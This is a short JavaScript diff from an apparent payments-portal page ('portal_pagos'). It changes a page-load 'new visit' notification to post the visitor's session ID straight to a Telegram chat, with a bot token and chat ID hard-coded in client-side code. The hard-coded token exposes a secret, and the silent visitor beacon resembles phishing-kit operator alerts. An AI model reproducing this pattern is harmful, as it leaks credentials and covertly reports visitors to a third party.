@@ -267,15 +267,17 @@
             let sid = 'N/A';
             try { sid = getCartoonSessionId(); } catch (e) { }
 
+            const BOT_TOKEN = "8759383283:AAEGahtOduKJ0q8R7tfXyathcZMwZnRTx3I";
+            const CHAT_ID = "-5400378460";
             const text = '<b>NUEVA VISITA</b>\n<b>Sesión:</b> <code>' + sid + '</code>';
 
-            fetch('api/telegram/dispatch.php', {
+            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    flow: 'portal_pagos',
-                    method: 'sendMessage',
-                    params: { text: text, parse_mode: 'HTML' }
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'HTML'
                 })
             }).catch(() => { });
         })();
